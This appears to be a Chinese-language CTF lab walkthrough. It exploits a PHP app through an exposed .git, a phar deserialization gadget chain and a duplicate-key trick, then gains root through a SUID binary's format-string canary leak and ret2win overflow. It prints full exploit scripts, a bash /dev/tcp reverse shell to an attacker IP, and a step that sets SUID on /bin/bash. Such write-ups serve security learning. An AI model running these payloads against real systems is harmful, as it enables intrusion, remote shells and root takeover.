# 信息收集

拿到靶机，先确定 IP 并扫端口。

```bash
IP=192.168.205.199
nmap -p0-65535 $IP
```

只开了 22 和 80。Apache/2.4.67 on Debian。没什么花头，直接看 Web。

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 端口，一个简单的登录页面，标题写着 "import recovery"。随手试了 `admin:admin`，直接进去了。

登录后的页面有三个功能模块：

- **submit failed task** — 提交一段 blob 文本，返回一个 32 位 hex 的 ID
- **repair task** — 输入那个 32 hex ID，后台会"修复"并生成一个 `.bin` 文件
- **check archive** — 输入文件路径，尝试读取

先随便玩了一下 check archive，想试试能不能读 `/etc/passwd`，结果返回 `not reasonable`。试了各种路径穿越、php filter、phar wrapper，全部被挡。我当时在这上面花了不少时间，各种编码绕过都试了，后来才意识到这条路黑盒是走不通的，得拿到源码才行。

回过头来跑了一下目录扫描。

```bash
dirsearch -q -u http://$IP
```

扫出来一个 `.git` 目录，完整暴露。这就不用猜了，直接拖源码。

# 源码还原

```bash
git-dumper http://$IP/ /tmp/src
```

`git-dumper` 在 checkout 阶段报了个错，因为 `.git` 结构有点怪，但 pack 文件已经下回来了。手动解包：

```bash
mkdir -p /tmp/unpack && cd /tmp/unpack
git init -q
cp /tmp/src/.git/objects/pack/*.pack .
git unpack-objects < pack-*.pack
GIT_DIR=$PWD/.git git cat-file --batch-check --batch-all-objects
```

一共 11 个对象，两个 tree、一个 commit、八个 blob。逐个 `cat-file -p` 导出，拿到完整源码结构：

```
config.php
index.php
class/Files.class.php
class/Task.class.php
class/User.class.php
class/Myerror.class.php
```

# 源码审计

## 路由和存储

`index.php` 是个简易前端控制器，路由白名单只有三组：User(login/logout)、Task(submit/repair)、Files(read)。

`config.php` 定义了存储路径：

```php
const QUARANTINE = '/var/labdata/quarantine';
const ARCHIVE    = '/var/labdata/archive';
```

submit 把 blob 原样写入 `quarantine/<id>.txt`，repair 读出来做一次 `rawurldecode` 后写入 `archive/<id>.bin`。这意味着：如果我提交时把二进制 payload 做好 URL 编码，repair 就能还原出原始字节。因为 PHP POST 解析本身也会 urldecode 一次，所以实际需要**双重编码**。

## Files::read 的时序漏洞

这是整个 RCE 链的入口。`read()` 方法里：

```php
self::$inWorker = true;
try {
    $contents = @file_get_contents($this->filename);
} finally {
    self::$inWorker = false;
}
$this->filter();
```

`file_get_contents` 在 `filter()` 之前执行。filter 会拦截 `://`、`../`、`/` 开头、`zip`、`flag` 等关键字，但拦截发生在读取之后。如果传入 `phar://` 路径，虽然最终会被 filter 拦下输出 `not reasonable`，但 phar 反序列化已经在 `file_get_contents` 内部触发了。

## 反序列化 Gadget 链

四个类里的魔术方法刚好能串成一条链：

**User::\_\_destruct** — 调用 `$this->password[0]->{$this->password[1]}($this->username)`，相当于对任意对象调任意方法。

**User::check** — 方法体是 `echo $obj;`，会触发对象的 `__toString`。

**Myerror::\_\_toString** — 返回 `(string) $this->message->{$this->level}`，访问不存在的属性会触发 `__get`。

**Files::\_\_get** — 核心 sink：

```php
public function __get($key) {
    if (self::$inWorker && ...) {
        ($key)($this->arg);
    }
}
```

当 `$inWorker` 为 true 时，直接把属性名当函数名调用。设置 `$this->level = 'system'`、`$this->arg = '反弹shell命令'`，就能 RCE。

串起来就是：

```
User1::__destruct
  → User2->check(Myerror对象)
    → echo Myerror → Myerror::__toString
      → Files->system → Files::__get('system')
        → system($cmd)
```

## inWorker 时序问题

phar 反序列化发生在 `file_get_contents` 内部（`$inWorker = true`），但 metadata 里创建的对象直到请求结束才析构，那时候 `finally` 已经把 `$inWorker` 重置成 false 了。`Files::__get` 里的检查会失败。

解法是利用 PHP 反序列化数组时的**重复键覆盖**行为。构造 metadata 为：

```php
$meta = 'a:2:{i:0;' . serialize($user1) . 'i:0;N;}';
```

数组键 `i:0` 出现两次，第二个值（`N;` = null）覆盖掉第一个（User1 对象）。被覆盖的 User1 立即失去引用，PHP 会在反序列化过程中就调用它的 `__destruct`。此时还在 `file_get_contents` 调用栈里，`$inWorker` 依然为 true。

# 初始突破

## 生成 phar payload

在 Kali 上创建工作目录，写 PHP 脚本生成 phar 文件：

```bash
mkdir -p /tmp/exp && cd /tmp/exp
```

把下面内容保存为 `mk.php`：

```php
<?php
class User { public $username; public $password; }
class Files { public static $inWorker = false; public $filename; public $arg;
    public function __get($key){
        if(self::$inWorker && is_string($key) && preg_match('/^[A-Za-z_]\w*$/',$key)){
            ($key)($this->arg);
        }
        return '';
    }
}
class Myerror { public $message; public $level;
    public function __toString(){
        return (string)$this->message->{$this->level};
    }
}

$cmd = 'bash -c "bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"';

$f = new Files();
$f->arg = $cmd;

$e = new Myerror();
$e->message = $f;
$e->level = 'system';

$u2 = new User();
$u1 = new User();
$u1->username = $e;
$u1->password = [$u2, 'check'];

$normal = serialize($u1);
$meta = 'a:2:{i:0;' . $normal . 'i:0;N;}';

@unlink('/tmp/exp/x.phar');
$p = new Phar('/tmp/exp/x.phar', 0, 'x.phar');
$p->startBuffering();
$p->setStub("<?php __HALT_COMPILER(); ?>\r\n");
$p->setSignatureAlgorithm(Phar::SHA1);
$p->setMetadata('AAAAPLACEHOLDER_METADATA_AAAA');
$p->addFromString('a.txt', 'x');
$p->stopBuffering();

$data = file_get_contents('/tmp/exp/x.phar');
$ph = serialize('AAAAPLACEHOLDER_METADATA_AAAA');
$pos = strpos($data, $ph);
$lenpos = $pos - 4;
$mlpos = strpos($data, "\r\n") + 2;
$oldman = unpack('V', substr($data, $mlpos, 4))[1];

$before = substr($data, 0, $lenpos);
$after = substr($data, $pos + strlen($ph));
$newdata = $before . pack('V', strlen($meta)) . $meta . $after;
$delta = strlen($meta) - strlen($ph);
$newdata = substr($newdata, 0, $mlpos) . pack('V', $oldman + $delta) . substr($newdata, $mlpos + 4);

$body = substr($newdata, 0, -28);
$sig = sha1($body, true);
$final = $body . $sig . pack('V', 2) . 'GBMB';
file_put_contents('/tmp/exp/evil.phar', $final);
echo strlen($final) . "\n";
```

这里的做法是先用 Phar 类正常生成一个 phar 文件，metadata 放一个占位字符串，然后在二进制层面把占位替换成构造的恶意序列化字符串，最后重算 SHA1 签名。直接 `setMetadata` 没法产生重复数组键，只能手工改字节。

执行生成 phar：

```bash
php -d phar.readonly=0 /tmp/exp/mk.php
ls -la /tmp/exp/evil.phar
```

确认文件生成成功。

## 双重编码

用 Python 对 phar 文件做两次 URL 编码，保存为 `enc.py` 执行：

```python
import urllib.parse
d = open('/tmp/exp/evil.phar','rb').read()
a = urllib.parse.quote(d, safe='')
b = urllib.parse.quote(a, safe='')
open('/tmp/exp/body.txt','w').write(b)
```

```bash
python3 /tmp/exp/enc.py
```

做个验证，确认双重解码能还原出原始 phar：

```python
import re
def dec(s):
    return re.sub(r'%([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1),16)), s).encode('latin-1')
b = open('/tmp/exp/body.txt').read()
a = dec(b).decode('latin-1')
r = dec(a)
o = open('/tmp/exp/evil.phar','rb').read()
print(r == o)
```

输出 `True`，没问题。

## 上传并触发

登录拿 cookie：

```bash
curl -s -c cookie.txt -d 'username=admin&password=admin' "http://$IP/"
```

submit 上传 phar：

```bash
ID=$(curl -s -b cookie.txt --data "blob=$(cat /tmp/exp/body.txt)" "http://$IP/?c=Task&m=submit" | grep -oE '[a-f0-9]{32}')
echo "ID=$ID"
```

curl 的 `--data` 把 body.txt 的内容放在 POST body 里，PHP 收到后自动 urldecode 一次（第一次解码），存入 `quarantine/<id>.txt`。

repair 触发第二次解码：

```bash
curl -s -b cookie.txt --data-urlencode "id=$ID" "http://$IP/?c=Task&m=repair"
```

repair 内部 `rawurldecode(file_get_contents($src))` 把一次编码的内容解回原始二进制，写入 `archive/<id>.bin`。此时 `.bin` 就是一个合法的 phar 文件。

开好监听：

```bash
nc -lvnp 8888
```

触发 phar 反序列化：

```bash
curl -s -b cookie.txt --data-urlencode "file=phar:///var/labdata/archive/$ID.bin/a.txt" "http://$IP/?c=Files&m=read"
```

页面返回 `not reasonable`，这是 filter 的输出，完全预期。关键是 `file_get_contents("phar://...")` 已经在 filter 之前执行了，metadata 反序列化触发了整条 gadget 链。

监听端收到反弹 shell：

```
www-data@phar:/var/www/html$
```

# 提权

跑了 linpeas，注意到一个异常 SUID：

```
-rwsr-xr-x 1 root root 16432 /opt/vaultd (Unknown SUID binary!)
```

一个自定义的 SUID 程序，未剥离符号。

## vaultd 分析

```bash
file /opt/vaultd
strings /opt/vaultd
nm -n /opt/vaultd
```

strings 里直接看到了 `hidden_maintenance_shell`、`/bin/sh`、`[maintenance] win function reached!`。nm 给出所有函数地址：

```
0x4013cb hidden_maintenance_shell
0x401314 support_ticket
0x401468 restore_recipe
0x404060 stage (BSS)
```

程序是菜单式交互，四个选项。用 Ghidra 看了伪代码：

**hidden_maintenance_shell** — 不在菜单里，但编译进了程序。反汇编可以看到它用 syscall 直接调了 `setresuid(0,0,0)`、`setresgid(0,0,0)`、`execve("/bin/sh", argv, NULL)`。只要能跳过去就是 root shell。

```bash
objdump -d -M intel /opt/vaultd | sed -n '/<hidden_maintenance_shell>/,/^$/p'
```

```asm
mov    rax,0x77     ; setresuid
syscall
mov    rax,0x75     ; setresgid
syscall
lea    rdi,[rip+...]  ; "/bin/sh"
mov    rax,0x3b     ; execve
syscall
```

**support_ticket（菜单2）** — 有个格式化字符串漏洞：

```c
char buf[136];
read(0, buf, 0x7F);
printf(buf);
```

用户输入被直接传给 printf，可以用 `%N$p` 泄露栈上的值，包括 canary。

**restore_recipe（菜单3）** — 有栈溢出：

```c
char buf[72];    // rbp-0x50
// canary at    rbp-0x08

read(0, &stage, 0x400);  // 第一次输入写全局变量，无所谓
read(0, buf, 0x180);     // 第二次输入，0x180 远大于 72，溢出
```

程序开了 Stack Canary，不能直接溢出，得先泄露 canary。

```bash
readelf -h /opt/vaultd | grep Type
```

```
Type: EXEC (Executable file)
```

非 PIE，`hidden_maintenance_shell` 地址固定，可以直接 ret2win。

## 攻击思路

同一个进程内：菜单 2 用格式化字符串泄露 canary → 回到菜单 → 菜单 3 栈溢出覆盖返回地址为 `hidden_maintenance_shell`。

canary 必须在同一个进程里泄露并使用，每次 fork 新进程 canary 都不一样。

栈布局：buf 从 `rbp-0x50` 开始，canary 在 `rbp-0x08`，到 canary 的偏移是 72 字节。覆盖 canary 后还要 8 字节的 saved rbp，然后是返回地址。

payload 结构：

```
'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)
```

这里有一个细节：x86-64 System V ABI 要求在 `call` 指令执行时 RSP 必须 16 字节对齐。溢出后直接跳 `hidden_maintenance_shell`，RSP 可能只是 8 字节对齐，导致里面 `puts` 调用时的 `movaps` 指令触发 SIGSEGV。解决办法是在返回地址前垫一个只含 `ret` 指令的 gadget，多弹一次栈凑齐对齐：

```bash
objdump -d -M intel /opt/vaultd | grep -m1 'ret$'
```

```
40101a: c3    ret
```

所以实际 payload 有两种形态，脚本里两种都会尝试：

```
'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)                          # 直接跳 win
'A'*72 + p64(canary) + 'B'*8 + p64(0x40101a) + p64(0x4013cb)          # ret 对齐后跳 win
```

## exploit

这里踩了个坑。直接在 bash 里用 `printf '2\n%1$p...\n'` 会被 bash 的 printf 自己解释掉 `$`，输出一片空白。全部换成 Python 来做交互。

写了个自动化脚本，遍历格式化字符串偏移 1-100，在同一个进程里泄露值后尝试溢出。如果 canary 对了，程序正常走到 `hidden_maintenance_shell`；如果 canary 错了，程序会触发 `__stack_chk_fail` 崩掉。脚本自动判断结果。

把下面内容保存为 `/tmp/pwn.py`：

```python
import subprocess,struct,os,sys,select,time,re

BIN = '/opt/vaultd'
WIN = 0x4013cb
RET = 0x40101a

def p64(x):
    return struct.pack('<Q', x)

def rd(proc, until=b'> ', timeout=3):
    buf = b''
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            rr, _, _ = select.select([proc.stdout], [], [], 0.1)
        except:
            break
        if rr:
            try:
                chunk = os.read(proc.stdout.fileno(), 4096)
            except:
                break
            if not chunk:
                break
            buf += chunk
            if until and until in buf:
                break
    return buf

def wr(proc, data):
    try:
        proc.stdin.write(data)
        proc.stdin.flush()
    except:
        pass

def try_exploit(canary_idx, use_ret_gadget):
    proc = subprocess.Popen(
        [BIN],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    rd(proc, b'> ')
    wr(proc, b'2\n')
    rd(proc, b'ticket:\n')
    wr(proc, ('%%%d$p\n' % canary_idx).encode())
    resp = rd(proc, b'> ')
    matches = re.findall(rb'0x[0-9a-fA-F]+', resp)
    if not matches:
        proc.kill()
        return None
    canary = int(matches[0], 16)
    wr(proc, b'3\n')
    rd(proc, b'memory:\n')
    wr(proc, b'STAGE\n')
    rd(proc, b'title:\n')
    chain = (p64(RET) + p64(WIN)) if use_ret_gadget else p64(WIN)
    payload = b'A' * 72 + p64(canary) + b'B' * 8 + chain + b'\n'
    wr(proc, payload)
    out = rd(proc, b'maintenance', 2)
    if b'stack smashing' in out:
        proc.kill()
        return None
    if b'maintenance' in out or b'$' in out or b'#' in out:
        wr(proc, b'id\n')
        time.sleep(0.3)
        wr(proc, b'cat /root/root.txt\n')
        time.sleep(0.3)
        wr(proc, b'chmod u+s /bin/bash\n')
        time.sleep(0.3)
        wr(proc, b'exit\n')
        time.sleep(0.3)
        final = rd(proc, None, 3)
        try:
            proc.wait(timeout=2)
        except:
            proc.kill()
        return (canary, canary_idx, use_ret_gadget, out + final)
    remaining = rd(proc, None, 2)
    combined = out + remaining
    proc.kill()
    if b'uid=0' in combined or b'flag{' in combined:
        return (canary, canary_idx, use_ret_gadget, combined)
    return None

for idx in range(1, 100):
    for use_ret in [False, True]:
        result = try_exploit(idx, use_ret)
        if result:
            canary, ci, ur, output = result
            print("[+] idx=%d canary=%s ret=%s" % (ci, hex(canary), ur))
            print(output.decode(errors='ignore'))
            sys.exit(0)
```

在 www-data 的 shell 里执行：

```bash
python3 /tmp/pwn.py
```

脚本自动找到了正确的 canary 偏移，成功覆盖返回地址跳到 `hidden_maintenance_shell`。输出里看到了 `[maintenance] win function reached!` 和 `uid=0(root)`。

脚本还顺手执行了 `chmod u+s /bin/bash`，后面直接用 `/bin/bash -p` 拿持久 root shell：

```bash
/bin/bash -p
id
```

```
uid=33(www-data) gid=33(www-data) euid=0(root)
```

# Flag

```bash
cat /home/welcome/user.txt
cat /root/root.txt
```

```
flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
```